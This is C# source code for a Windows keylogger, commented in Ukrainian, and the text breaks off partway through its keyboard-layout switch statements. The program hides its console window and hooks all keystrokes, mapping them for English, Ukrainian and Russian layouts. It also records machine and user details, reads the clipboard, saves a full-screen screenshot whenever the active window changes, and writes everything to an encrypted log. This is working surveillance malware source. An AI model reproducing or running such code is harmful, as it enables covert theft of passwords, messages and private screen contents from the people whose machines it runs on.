using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Threading;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Drawing;
using System.Drawing.Imaging;

namespace ConsoleApplication1
{
    class Program
    {
        // ініціалізація параметрів

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;
        private const int WM_SYSKEYDOWN = 0x0104;
        public const int KF_REPEAT = 0X40000000;

        private const int VK_SHIFT = 0x10;	// SHIFT
        private const int VK_CONTROL = 0x11;	// CONTROL
        private const int VK_MENU = 0x12; // ALT
        private const int VK_CAPITAL = 0x14; // CAPS LOCK

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static string mss;
        public static string v2;
        public static int myi = 0;

        [STAThread]
        static void Main(string[] args)
        {

            var handle = GetConsoleWindow();


            // Hide
            ShowWindow(handle, SW_HIDE);
            MessageBox.Show("Клавіатурний шпигун запущений \n Для завершення програми використовуйте комбінацію клавіш Ctrl+Y");

            _hookID = SetHook(_proc);
            // дані про користувача

            WriterLine(Encrypt("\n CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"));
            WriterLine(Encrypt("\n MachineName: {0}" + Environment.MachineName + "\n", "Key"));
            WriterLine(Encrypt("\n OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
            WriterLine(Encrypt("\n SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
            WriterLine(Encrypt("\n UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
            WriterLine(Encrypt("\n UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
            WriterLine(Encrypt("\n UserName: {0}" + Environment.UserName + "\n", "Key"));

            // буфер обміну
            string htmlData = GetBuff();
            Console.WriteLine("Clipboard: {0}", htmlData);
            // розкладка клавіатури
            ushort lang = GetKeyboardLayout();
            mss = lang.ToString();
            Application.Run();
            UnhookWindowsHookEx(_hookID);



        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            string v = GetActiveWindowTitle();
            if (v != v2)
            {
                v2 = v;
                WriterLine(Encrypt("Вікно: " + v2 + "\n", "Key"));
                Graphics graph = null;
                var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                graph = Graphics.FromImage(bmp);
                graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                String s = DateTime.Now.ToString("yyyy.MM.dd_HH-mm-ss");
                bmp.Save(Application.StartupPath +@"\" +  s +".bmp");

            }

            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                KeysConverter kc = new KeysConverter();
                string mystring = kc.ConvertToString((Keys)vkCode);

                string original = mystring;
                string encrypted;

                // запрошуємо розкладку клавіатури
                ushort lang_check = GetKeyboardLayout();
                string mss_check = lang_check.ToString();
                int mss_cs = Convert.ToInt32(mss_check);

                if (mss == mss_check) { }
                else if (mss_cs == 1049)
                {
                    encrypted = Encrypt(" <Зміна розкладки:  Російська> \n", "Key");
                    WriterLine(encrypted);
                    mss = mss_check;
                }
                if (mss == mss_check) { }
                else if (mss_cs == 1058)
                {
                    Console.WriteLine("\n Зміна розкладки: {0}", mss_check);
                    encrypted = Encrypt("\n <Зміна розкладки: Українська> \n", "Key");
                    WriterLine(encrypted);
                    mss = mss_check;
                }
                if (mss == mss_check) { }
                else if (mss_cs == 1033)
                {
                    Console.WriteLine("\n Зміна розкладки: {0}", mss_check);
                    encrypted = Encrypt("\n <Зміна розкладки: Англійська> \n", "Key");
                    WriterLine(encrypted);
                    mss = mss_check;
                }

                if (wParam == (IntPtr)WM_KEYDOWN)   //всі клавіши підряд
                {
                    if (mss_cs == 1033)
                    {

                        switch (original)
                        {
                            case "Назад":
                                Writer(Encrypt(" <Назад> ", "Key"));
                                break;
                            case "L":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("L", "Key"));
                                else
                                    Writer(EncryptL("L", "Key"));
                                break;
                            case "Q":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Q", "Key"));
                                else
                                    Writer(EncryptL("Q", "Key"));
                                break;
                            case "A":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Виділити усе\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("A", "Key"));
                                else
                                    Writer(EncryptL("A", "Key"));
                                break;
                            case "Z":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Відміна\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Z", "Key"));
                                else
                                    Writer(EncryptL("Z", "Key"));
                                break;
                            case "W":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("W", "Key"));
                                else
                                    Writer(EncryptL("W", "Key"));
                                break;
                            case "S":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("S", "Key"));
                                else
                                    Writer(EncryptL("S", "Key"));
                                break;
                            case "X":
                                if (Keys.Control == Control.ModifierKeys)
                                    Writer(Encrypt("Вирізати", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("X", "Key"));
                                else
                                    Writer(EncryptL("X", "Key"));
                                break;
                            case "E":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("E", "Key"));
                                else
                                    Writer(EncryptL("E", "Key"));
                                break;
                            case "D":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("D", "Key"));
                                else
                                    Writer(EncryptL("D", "Key"));
                                break;
                            case "C":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Копіювати\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("C", "Key"));
                                else
                                    Writer(EncryptL("С", "Key"));
                                break;
                            case "R":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("R", "Key"));
                                else
                                    Writer(EncryptL("R", "Key"));
                                break;
                            case "F":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Пошук\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("F", "Key"));
                                else
                                    Writer(EncryptL("F", "Key"));
                                break;
                            case "V":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Вставити\n", ""));
                             else   if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("V", "Key"));
                                else
                                {
                                    Writer(EncryptL("V", "Key"));
                                }

                                break;
                            case "T":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("T", "Key"));
                                else
                                    Writer(EncryptL("T", "Key"));
                                break;
                            case "G":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("G", "Key"));
                                else
                                    Writer(EncryptL("G", "Key"));
                                break;
                            case "B":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("B", "Key"));
                                else
                                    Writer(EncryptL("B", "Key"));
                                break;
                            case "Y":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Y", "Key"));
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt(" \n Закриття шпигуна", "Key"));
                                else
                                {
                                    Writer(EncryptL("Y", "Key"));
                                }
                                break;
                            case "H":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("H", "Key"));
                                else
                                    Writer(EncryptL("H", "Key"));
                                break;
                            case "N":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("N", "Key"));
                                else
                                    Writer(EncryptL("N", "Key"));
                                break;
                            case "U":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("U", "Key"));
                                else
                                    Writer(EncryptL("U", "Key"));
                                break;
                            case "J":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("J", "Key"));
                                else
                                    Writer(EncryptL("J", "Key"));
                                break;
                            case "M":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("M", "Key"));
                                else
                                    Writer(EncryptL("M", "Key"));
                                break;
                            case "I":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("I", "Key"));
                                else
                                    Writer(EncryptL("I", "Key"));
                                break;
                            case "K":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("K", "Key"));
                                else
                                    Writer(EncryptL("K", "Key"));
                                break;
                            case "Space":
                                Writer(EncryptL(" ", "Key"));
                                break;
                            case "LCONTROLKEY":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "Oemcomma":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("<", "Key"));
                                else
                                    Writer(EncryptL(",", "Key"));
                                break;
                            case "O":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("O", "Key"));
                                else
                                    Writer(EncryptL("O", "Key"));
                                break;
                            case "OemPeriod":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt(">", "Key"));
                                else
                                    Writer(EncryptL(".", "Key"));
                                break;
                            case "P":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("p", "Key"));
                                else
                                    Writer(EncryptL("P", "Key"));
                                break;
                            case "Oem1":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt(";", "Key"));
                                else
                                    Writer(EncryptL(":", "Key"));
                                break;
                            case "OemQuestion":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("?", "Key"));
                                else
                                    Writer(EncryptL("/", "Key"));
                                break;
                            case "Enter":
                                WriterLine(EncryptL(" ", "Key"));
                                break;
                            case "OemOpenBrackets":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("{", "Key"));
                                else
                                    Writer(EncryptL("[", "Key"));
                                break;
                            case "Oem7":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("<<", "Key"));
                                else
                                    Writer(EncryptL("<", "Key"));
                                break;
                            case "Oem6":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("}", "Key"));
                                else
                                    Writer(EncryptL("]", "Key"));
                                break;
                            case "LShiftKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RShiftKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "LControlKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RControlKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "LMenu":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RMenu":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "LWin":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RWin":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "Apps":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "1":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("!", "Key"));
                                else Writer(EncryptL("1", "Key"));
                                break;
                            case "2":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("@", "Key"));
                                else Writer(EncryptL("2", "Key"));
                                break;
                            case "3":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("#", "Key"));
                                else Writer(EncryptL("3", "Key"));
                                break;
                            case "4":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("$", "Key"));
                                else Writer(EncryptL("4", "Key"));
                                break;
                            case "5":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("%", "Key"));
                                else Writer(EncryptL("5", "Key"));
                                break;
                            case "6":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("^", "Key"));
                                else Writer(EncryptL("6", "Key"));
                                break;
                            case "7":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("&", "Key"));
                                else Writer(EncryptL("7", "Key"));
                                break;
                            case "8":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("*", "Key"));
                                else Writer(EncryptL("8", "Key"));
                                break;
                            case "9":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("(", "Key"));
                                else Writer(EncryptL("9", "Key"));
                                break;
                            case "0":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL(")", "Key"));
                                else Writer(EncryptL("0", "Key"));
                                break;
                            case "OemMinus":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("_", "Key"));
                                else Writer(EncryptL("-", "Key"));
                                break;
                            case "Oemplus":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("+", "Key"));
                                else Writer(EncryptL("=", "Key"));
                                break;
                            default:
                                Writer(EncryptL(" " + original, "Key"));
                                break;
                        }
                    } //англійска
                    if (mss_cs == 1058)
                    {
                        switch (original)
                        {
                            case "Назад":
                                Writer(Encrypt(" <Назад> ", "Key"));
                                break;
                            case "L":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Д", "Key"));
                                else
                                    Writer(EncryptL("Д", "Key"));
                                break;
                            case "Q":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Й", "Key"));
                                else
                                    Writer(EncryptL("Й", "Key"));
                                break;
                            case "A":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Виділити усе\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ф", "Key"));
                                else
                                    Writer(EncryptL("Ф", "Key"));
                                break;
                            case "Z":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Відміна\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Я", "Key"));
                                else
                                    Writer(EncryptL("Я", "Key"));
                                break;
                            case "W":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ц", "Key"));
                                else
                                    Writer(EncryptL("Ц", "Key"));
                                break;
                            case "S":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("І", "Key"));
                                else
                                    Writer(EncryptL("І", "Key"));
                                break;
                            case "X":
                                if (Keys.Control == Control.ModifierKeys)
                                    Writer(Encrypt("Вирізати", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ч", "Key"));
                                else
                                    Writer(EncryptL("Ч", "Key"));
                                break;
                            case "E":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("У", "Key"));
                                else
                                    Writer(EncryptL("У", "Key"));
                                break;
                            case "D":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("В", "Key"));
                                else
                                    Writer(EncryptL("В", "Key"));
                                break;
                            case "C":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Копіювати\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("С", "Key"));
                                else
                                    Writer(EncryptL("С", "Key"));

                                break;
                            case "R":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("К", "Key"));
                                else
                                    Writer(EncryptL("К", "Key"));
                                break;
                            case "F":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Пошук\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("А", "Key"));
                                else
                                    Writer(EncryptL("А", "Key"));
                                break;
                            case "V":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Вставити\n", ""));
                               else  if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("М", "Key"));
                                else
                                {
                                    Writer(EncryptL("М", "Key"));
                                }
                                break;
                            case "T":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Е", "Key"));
                                else
                                    Writer(EncryptL("Е", "Key"));
                                break;
                            case "G":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("П", "Key"));
                                else
                                    Writer(EncryptL("П", "Key"));
                                break;
                            case "B":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("И", "Key"));
                                else
                                    Writer(EncryptL("И", "Key"));
                                break;
                            case "Y":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Н", "Key"));
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt(" \n Закриття шпигуна", "Key"));
                                else
                                {
                                    Writer(EncryptL("Н", "Key"));
                                }
                                break;
                            case "H":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Р", "Key"));
                                else
                                    Writer(EncryptL("Р", "Key"));
                                break;
                            case "N":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Т", "Key"));
                                else
                                    Writer(EncryptL("Т", "Key"));
                                break;
                            case "U":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Г", "Key"));
                                else
                                    Writer(EncryptL("Г", "Key"));
                                break;
                            case "J":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("О", "Key"));
                                else
                                    Writer(EncryptL("О", "Key"));
                                break;
                            case "M":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ь", "Key"));
                                else
                                    Writer(EncryptL("Ь", "Key"));
                                break;
                            case "I":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ш", "Key"));
                                else
                                    Writer(EncryptL("Ш", "Key"));
                                break;
                            case "K":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Л", "Key"));
                                else
                                    Writer(EncryptL("Л", "Key"));
                                break;
                            case "Space":
                                Writer(EncryptL(" ", "Key"));
                                break;
                            case "LCONTROLKEY":
                                Writer(EncryptL(" ", "Key"));
                                break;
                            case "Oemcomma":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Б", "Key"));
                                else
                                    Writer(EncryptL("Б", "Key"));
                                break;
                            case "O":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Щ", "Key"));
                                else
                                    Writer(EncryptL("Щ", "Key"));
                                break;
                            case "OemPeriod":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ю", "Key"));
                                else
                                    Writer(EncryptL("Ю", "Key"));
                                break;
                            case "P":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("З", "Key"));
                                else
                                    Writer(EncryptL("З", "Key"));
                                break;
                            case "Oem1":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ж", "Key"));
                                else
                                    Writer(EncryptL("Ж", "Key"));
                                break;
                            case "OemQuestion":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt(",", "Key"));
                                else
                                    Writer(EncryptL(".", "Key"));
                                break;
                            case "Enter":
                                WriterLine(EncryptL(" ", "Key"));
                                break;
                            case "OemOpenBrackets":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Х", "Key"));
                                else
                                    Writer(EncryptL("Х", "Key"));
                                break;
                            case "Oem7":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Є", "Key"));
                                else
                                    Writer(EncryptL("Є", "Key"));
                                break;
                            case "Oem6":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ї", "Key"));
                                else
                                    Writer(EncryptL("Ї", "Key"));
                                break;
                            case "LShiftKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RShiftKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "LControlKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RControlKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "LMenu":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RMenu":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "LWin":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RWin":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "Apps":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "1":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("!", "Key"));
                                else Writer(EncryptL("1", "Key"));
                                break;
                            case "2":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("@", "Key"));
                                else Writer(EncryptL("2", "Key"));
                                break;
                            case "3":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("№", "Key"));
                                else Writer(EncryptL("3", "Key"));
                                break;
                            case "4":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL(";", "Key"));
                                else Writer(EncryptL("4", "Key"));
                                break;
                            case "5":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("%", "Key"));
                                else Writer(EncryptL("5", "Key"));
                                break;
                            case "6":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL(":", "Key"));
                                else Writer(EncryptL("6", "Key"));
                                break;
                            case "7":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("?", "Key"));
                                else Writer(EncryptL("7", "Key"));
                                break;
                            case "8":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("*", "Key"));
                                else Writer(EncryptL("8", "Key"));
                                break;
                            case "9":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("(", "Key"));
                                else Writer(EncryptL("9", "Key"));
                                break;
                            case "0":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL(")", "Key"));
                                else Writer(EncryptL("0", "Key"));
                                break;
                            case "OemMinus":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("_", "Key"));
                                else Writer(EncryptL("-", "Key"));
                                break;
                            case "Oemplus":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("+", "Key"));
                                else Writer(EncryptL("=", "Key"));
                                break;
                            default:
                                Writer(EncryptL(" " + original, "Key"));
                                break;
                        }

                    } //україніська
                    if (mss_cs == 1049)
                    {
                        switch (original)
                        {
                            case "Назад":
                                Writer(Encrypt(" <Назад> ", "Key"));
                                break;
                            case "L":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Д", "Key"));
                                else
                                    Writer(EncryptL("Д", "Key"));
                                break;
                            case "Q":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Й", "Key"));
                                else
                                    Writer(EncryptL("Й", "Key"));
                                break;
                            case "A":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Виділити усе\n", " "));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ф", "Key"));
                                else
                                    Writer(EncryptL("Ф", "Key"));
                                break;
                            case "Z":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Відміна\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Я", "Key"));
                                else
                                    Writer(EncryptL("Я", "Key"));
                                break;
                            case "W":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ц", "Key"));
                                else
                                    Writer(EncryptL("Ц", "Key"));
                                break;
                            case "S":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ы", "Key"));
                                else
                                    Writer(EncryptL("Ы", "Key"));
                                break;
                            case "X":
                                if (Keys.Control == Control.ModifierKeys)
                                    Writer(Encrypt("Вирізати", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ч", "Key"));
                                else
                                    Writer(EncryptL("Ч", "Key"));
                                break;
                            case "E":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("У", "Key"));
                                else
                                    Writer(EncryptL("У", "Key"));
                                break;
                            case "D":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("В", "Key"));
                                else
                                    Writer(EncryptL("В", "Key"));
                                break;
                            case "C":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Копіювати\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("С", "Key"));
                                else
                                    Writer(EncryptL("С", "Key"));

                                break;
                            case "R":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("К", "Key"));
                                else
                                    Writer(EncryptL("К", "Key"));
                                break;
                            case "F":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Пошук\n", ""));
                                else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("А", "Key"));
                                else
                                    Writer(EncryptL("А", "Key"));
                                break;
                            case "V":
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt("Вставити\n", ""));
                               else if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("М", "Key"));
                                else
                                {
                                    Writer(EncryptL("М", "Key"));
                                }
                                break;
                            case "T":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Е", "Key"));
                                else
                                    Writer(EncryptL("Е", "Key"));
                                break;
                            case "G":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("П", "Key"));
                                else
                                    Writer(EncryptL("П", "Key"));
                                break;
                            case "B":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("И", "Key"));
                                else
                                    Writer(EncryptL("И", "Key"));
                                break;
                            case "Y":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Н", "Key"));
                                if (Keys.Control == Control.ModifierKeys)
                                    WriterLine(Encrypt(" \n Закриття шпигуна", "Key"));
                                else
                                {
                                    Writer(EncryptL("Н", "Key"));
                                }
                                break;
                            case "H":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Р", "Key"));
                                else
                                    Writer(EncryptL("Р", "Key"));
                                break;
                            case "N":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Т", "Key"));
                                else
                                    Writer(EncryptL("Т", "Key"));
                                break;
                            case "U":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Г", "Key"));
                                else
                                    Writer(EncryptL("Г", "Key"));
                                break;
                            case "J":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("О", "Key"));
                                else
                                    Writer(EncryptL("О", "Key"));
                                break;
                            case "M":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ь", "Key"));
                                else
                                    Writer(EncryptL("Ь", "Key"));
                                break;
                            case "I":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ш", "Key"));
                                else
                                    Writer(EncryptL("Ш", "Key"));
                                break;
                            case "K":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Л", "Key"));
                                else
                                    Writer(EncryptL("Л", "Key"));
                                break;
                            case "Space":
                                Writer(EncryptL(" ", "Key"));
                                break;
                            case "LCONTROLKEY":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "Oemcomma":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Б", "Key"));
                                else
                                    Writer(EncryptL("Б", "Key"));
                                break;
                            case "O":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Щ", "Key"));
                                else
                                    Writer(EncryptL("Щ", "Key"));
                                break;
                            case "OemPeriod":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ю", "Key"));
                                else
                                    Writer(EncryptL("Ю", "Key"));
                                break;
                            case "P":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("З", "Key"));
                                else
                                    Writer(EncryptL("З", "Key"));
                                break;
                            case "Oem1":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ж", "Key"));
                                else
                                    Writer(EncryptL("Ж", "Key"));
                                break;
                            case "OemQuestion":
                                Writer(EncryptL(".", "Key"));
                                break;
                            case "Enter":
                                WriterLine(EncryptL(" ", "Key"));
                                break;
                            case "OemOpenBrackets":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Х", "Key"));
                                else
                                    Writer(EncryptL("Х", "Key"));
                                break;
                            case "Oem7":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Э", "Key"));
                                else
                                    Writer(EncryptL("Э", "Key"));
                                break;
                            case "Oem6":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(Encrypt("Ъ", "Key"));
                                else
                                    Writer(EncryptL("Ъ", "Key"));
                                break;
                            case "LShiftKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RShiftKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "LControlKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RControlKey":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "LMenu":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "RMenu":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "LWin":
